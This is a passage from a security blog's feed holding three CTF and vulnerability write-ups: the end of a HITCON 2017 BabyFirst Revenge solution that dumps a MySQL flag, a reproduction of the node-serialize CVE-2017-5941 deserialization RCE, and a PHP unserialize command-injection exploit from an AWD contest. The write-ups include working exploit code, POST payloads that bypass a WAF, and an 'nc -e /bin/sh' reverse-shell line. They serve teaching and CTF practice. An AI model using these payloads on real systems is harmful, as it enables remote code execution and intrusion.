<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;show databases;&quot; &gt; kk5</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk5，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk5，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Database</div><div class="line">information_schema</div><div class="line">fl4gdb</div></pre></td></tr></table></figure></p>
<p>index.html:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=0x666c34676462&quot; &gt; kk7</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk7，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk7，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">GROUP_CONCAT(table_name)</div><div class="line">this_is_the_fl4g</div></pre></td></tr></table></figure></p>
<p>index.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql -ufl4444g -pSugZXUtgeJ52_Bvr -e &quot;(SELECT * FROM fl4gdb.this_is_the_fl4g&quot; &gt;　kk9</div></pre></td></tr></table></figure></p>
<p>访问：<a href="http://52.199.204.34/sandbox/对应md5/kk9，" target="_blank" rel="external">http://52.199.204.34/sandbox/对应md5/kk9，</a> 得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">secret</div><div class="line">hitcon&#123;idea_from_phith0n,thank_you:)&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171104/8.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;HITCON CTF 2017-BabyFirst Revenge-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Node.js中的反序列化漏洞：CVE-2017-5941</title>
    <link href="http://chybeta.github.io/2017/11/01/Node-js%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9ACVE-2017-5941/"/>
    <id>http://chybeta.github.io/2017/11/01/Node-js中的反序列化漏洞：CVE-2017-5941/</id>
    <published>2017-11-01T10:14:53.000Z</published>
    <updated>2017-11-01T13:08:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>合上吧，水文一篇。<br>Node.js中的反序列化漏洞？<br>（Node.js：这锅我不背）<br><a id="more"></a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>安装好node和npm后，安装一下主角node-serialize<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">npm install node-serialize@0.0.4 --save</div></pre></td></tr></table></figure></p>
<p>测试代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</div><div class="line"></div><div class="line"><span class="keyword">var</span> chybeta = &#123;</div><div class="line">	<span class="attr">vuln</span> : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'whoami'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>) </span>&#123;<span class="built_in">console</span>.log(stdout);&#125;);&#125;,</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">serResult = serialize.serialize(chybeta);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"serialize result:"</span>);</div><div class="line"><span class="built_in">console</span>.log(serResult+<span class="string">'\n'</span>);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Direct unserialize:"</span>)</div><div class="line">serialize.unserialize(serResult);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"\n"</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Use IIFE to PWN it:"</span>)</div><div class="line">exp = serResult.substr(<span class="number">0</span>,serResult.length<span class="number">-2</span>) + <span class="string">"()"</span> + serResult.substr(<span class="number">-2</span>);</div><div class="line"><span class="built_in">console</span>.log(exp);</div><div class="line"><span class="built_in">console</span>.log(<span class="string">"Exec whoami:"</span>)</div><div class="line">serialize.unserialize(exp);</div></pre></td></tr></table></figure></p>
<p>运行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">node index.js</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/5.png?raw=true" alt=""><br>可以看到执行了命令whoami</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="关于IIFE"><a href="#关于IIFE" class="headerlink" title="关于IIFE"></a>关于IIFE</h2><p>从运行截图来看，直接对序列化串进行反序列化，并不能导致远程命令执行，而是需要对序列化串进行修改。这里需要用到JS的IIFE(Immediately-Invoked Function Expression)，也即立即执行函数。这里简单的进行介绍。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/6.png?raw=true" alt=""></p>
<p>前两种写法都是很正常的函数调用。</p>
<p>而第三种<code>function(){console.log(&quot;Hello,chybeta three!&quot;)}();</code>，由于它直接以<code>function()</code>开头，js解释器默认情况下碰到function关键字时将其当作函数声明，而第三种写法缺少函数声明所必需的函数名。若要执行该函数，则必须显式地指定其为函数表达式。</p>
<p>第四种写法<code>(function(){console.log(&quot;Hello,chybeta four!&quot;)}());</code>，则是常见的IIFE写法，js解释器在遇到<code>()</code>时，将其中的内容解释为函数表达式，而不是函数声明，因此得以执行。注意在<code>Hello,chybeta four!&quot;)}</code>的后面还有一对括号<code>()</code></p>
<h2 id="node-serialize"><a href="#node-serialize" class="headerlink" title="node-serialize"></a>node-serialize</h2><p>在node-serialize的源码中，即node-serialize/lib/serialize.js，第59行开始，是对反序列(unserialize)的处理：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">exports.unserialize = <span class="function"><span class="keyword">function</span>(<span class="params">obj, originObj</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> isIndex;</div><div class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj === <span class="string">'string'</span>) &#123;</div><div class="line">    obj = <span class="built_in">JSON</span>.parse(obj);</div><div class="line">    isIndex = <span class="literal">true</span>;</div><div class="line">  &#125;</div><div class="line">  originObj = originObj || obj;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> circularTasks = [];</div><div class="line">  <span class="keyword">var</span> key;</div><div class="line">  <span class="keyword">for</span>(key <span class="keyword">in</span> obj) &#123;</div><div class="line">    <span class="keyword">if</span>(obj.hasOwnProperty(key)) &#123;</div><div class="line">      <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'object'</span>) &#123;</div><div class="line">        obj[key] = exports.unserialize(obj[key], originObj);</div><div class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">typeof</span> obj[key] === <span class="string">'string'</span>) &#123;</div><div class="line">        <span class="keyword">if</span>(obj[key].indexOf(FUNCFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = <span class="built_in">eval</span>(<span class="string">'('</span> + obj[key].substring(FUNCFLAG.length) + <span class="string">')'</span>);</div><div class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(obj[key].indexOf(CIRCULARFLAG) === <span class="number">0</span>) &#123;</div><div class="line">          obj[key] = obj[key].substring(CIRCULARFLAG.length);</div><div class="line">          circularTasks.push(&#123;<span class="attr">obj</span>: obj, <span class="attr">key</span>: key&#125;);</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">   .....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>其中有一句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval(&apos;(&apos; + obj[key].substring(FUNCFLAG.length) + &apos;)&apos;);</div></pre></td></tr></table></figure></p>
<p>不妨在该句之前加上console.log：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">console.log(obj[key].substring(FUNCFLAG.length));</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/7.png?raw=true" alt=""></p>
<p>执行<code>node index.js</code>，<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/8.png?raw=true" alt=""></p>
<p>所以在进行eval时，实际进行的语句为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">eval((function ()&#123;require(&apos;child_process&apos;).exec(&apos;whoami&apos;, function(error, stdout, stderr) &#123;console.log(stdout);&#125;);&#125;()));</div></pre></td></tr></table></figure></p>
<p>后面的这对括号<code>()</code>，正是我们在修改原反序列化串时加上的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">exp = serResult.substr(0,serResult.length-2) + &quot;()&quot; + serResult.substr(-2);</div></pre></td></tr></table></figure></p>
<p>eval执行了该语句，从而造成了命令执行。</p>
<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>将exec里的替换成反弹shell，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/sh xxx xxx</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/9.png?raw=true" alt=""></p>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="https://paper.seebug.org/213/" target="_blank" rel="external">利用 Node.js 反序列化漏洞远程执行代码</a></li>
<li><a href="http://www.4hou.com/technology/3457.html" target="_blank" rel="external">NodeJS反序列化RCE漏洞的完美利用</a></li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>无聊玩一玩。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;合上吧，水文一篇。&lt;br&gt;Node.js中的反序列化漏洞？&lt;br&gt;（Node.js：这锅我不背）&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="Node.js" scheme="http://chybeta.github.io/tags/Node-js/"/>
    
      <category term="反序列化" scheme="http://chybeta.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2017年百越杯AWD-web-writeup</title>
    <link href="http://chybeta.github.io/2017/10/28/2017%E5%B9%B4%E7%99%BE%E8%B6%8A%E6%9D%AFAWD-web-writeup/"/>
    <id>http://chybeta.github.io/2017/10/28/2017年百越杯AWD-web-writeup/</id>
    <published>2017-10-28T01:03:50.000Z</published>
    <updated>2017-10-31T23:15:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>再不更新博客就长草啦。<br>PHP反序列化漏洞。<br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周五参加福建省百越杯比赛，第二名。这篇小记一下线下赛的web题目，就当时找的漏洞做个简要的说明。由于一些配置不太清楚，所以现在复现起来可能不太准确，望见谅。原环境是linux下的，这里暂时win复现。</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>先看一下web源码的目录大概如下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/1.png?raw=true" alt=""></p>
<p>在common文件下，有一个home.php，其源码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</div><div class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</div><div class="line">        system(<span class="string">"ping -c 2 $host"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</div><div class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim(mysql_escape_string($v)));</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line">$a=@$_POST[<span class="string">'a'</span>];</div><div class="line">@unserialize($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>首先有一个home类，然后通过post接受参数a，并对其进行反序列化。仔细观察home类，里面有几个方法。</p>
<p><code>__construct</code>析构方法进行初始化操作，指定$method和$args。</p>
<p><code>__destruct</code>析构方法在对象销毁时调用，其中使用了<a href="http://php.net/manual/en/function.call-user-func-array.php" target="_blank" rel="external">call_user_func_array()</a>，如果method中有ping，则会调用ping方法，其参数即为$args。</p>
<p><code>ping</code>方法执行sysyem命令：<code>system(&quot;ping -c 2 $host&quot;);</code>，注意到$host参数，由前即home类实例的$args。</p>
<p><code>waf</code>方法，将传入的字符串中的空格去掉。</p>
<p><code>__wakeup</code>方法，在反序列化时会自动调用，其中实现的功能是将参数$args先经过mysql_escape_string()，然后去除两边空格（trim），调用waf方法去掉字符串中的空格。</p>
<p>看到这里，思路就很明确啦。构造反序列化字符串，先经过<code>__wakeup</code>的过滤，在执行结束后利用<code>__destruct</code>调用ping方法，利用其中的system执行任意命令。</p>
<p>exp如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span>&#123;</div><div class="line">    <span class="keyword">private</span> $method;</div><div class="line">    <span class="keyword">private</span> $args;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;   </div><div class="line">        <span class="keyword">$this</span>-&gt;method = $method;</div><div class="line">        <span class="keyword">$this</span>-&gt;args = $args;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"ping"</span>))) &#123;</div><div class="line">            call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span><span class="params">($host)</span></span>&#123;</div><div class="line">        system(<span class="string">"ping -c 2 $host"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($str)</span></span>&#123;</div><div class="line">        $str=str_replace(<span class="string">' '</span>,<span class="string">''</span>,$str);</div><div class="line">        <span class="keyword">return</span> $str;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</div><div class="line">        &#125;</div><div class="line">    &#125;   </div><div class="line">&#125;</div><div class="line"></div><div class="line">print_r(<span class="string">"New a chybeta :)&lt;/br&gt;"</span>);</div><div class="line">$chybeta = <span class="keyword">new</span> home(<span class="string">"ping"</span>,<span class="keyword">array</span>(<span class="string">"1|whoami"</span>));</div><div class="line"></div><div class="line">print_r(<span class="string">"&lt;/br&gt;Get the serialize result:&lt;/br&gt;"</span>);</div><div class="line">$exp = serialize($chybeta);</div><div class="line">print_r($exp);</div><div class="line"></div><div class="line">print_r(<span class="string">"&lt;/br&gt;&lt;/br&gt;unserialize and pwn it&lt;/br&gt;"</span>);</div><div class="line">print_r(<span class="string">"exec: system(\"whoami\")&lt;/br&gt;The result:  "</span>);</div><div class="line">serialize($exp);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/2.png?raw=true" alt=""></p>
<p>直接复制打印出来的反序列化串去post参数给home.php，并不成功。原因是有一些不可见字符。对以上的exp进行小改动，将反序列话结果输出到文件中，再用十六进制编辑器打开。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file_put_contents(<span class="string">"temp"</span>, $exp);</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/3.png?raw=true" alt=""><br>可以上发现有一些零字节需要补上，最后payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">访问 common/home.php</div><div class="line"></div><div class="line">POST:</div><div class="line">a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:8:&quot;1|whoami&quot;;&#125;&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171031/4.png?raw=true" alt=""></p>
<p>接下来进一步利用，在比赛时，我们需要读取到放在根目录下的flag（/flag）。而waf方法过滤了空格，这额可以用linux下的特殊变量<code>\$\{IFS\}</code>来代替。所以如果要读取flag，修改exp.php，注意需要转义<code>$</code>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$chybeta = new home(&quot;ping&quot;,array(&quot;1|cat\$&#123;IFS&#125;/flag&quot;));</div></pre></td></tr></table></figure></p>
<p>关于linux环境下的命令执行绕过waf的方法，不妨看看这个: <a href="https://github.com/CHYbeta/WAF-Bypass/blob/master/ming-ling-zhu-ru/rao-guo-fang-fa.md" target="_blank" rel="external">WAF-Bypass<br>:命令注入</a></p>
<p>最后的payload即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">访问 common/home.php</div><div class="line"></div><div class="line">POST:</div><div class="line">a=O:4:&quot;home&quot;:2:&#123;s:12:&quot;%00home%00method&quot;;s:4:&quot;ping&quot;;s:10:&quot;%00home%00args&quot;;a:1:&#123;i:0;s:16:&quot;1|cat$&#123;IFS&#125;/flag</div></pre></td></tr></table></figure></p>
<p>防御方法，直接将<code>@unserialize($a);</code>注释掉就行啦。</p>
<p>关于PHP反序列化漏洞，可以看看另一篇文章：<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">chybeta: 浅谈php反序列化漏洞</a></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>比赛攻击是用的就是这个洞，应该还有其他漏洞，后面再进一步补上吧。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;再不更新博客就长草啦。&lt;br&gt;PHP反序列化漏洞。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
</feed>
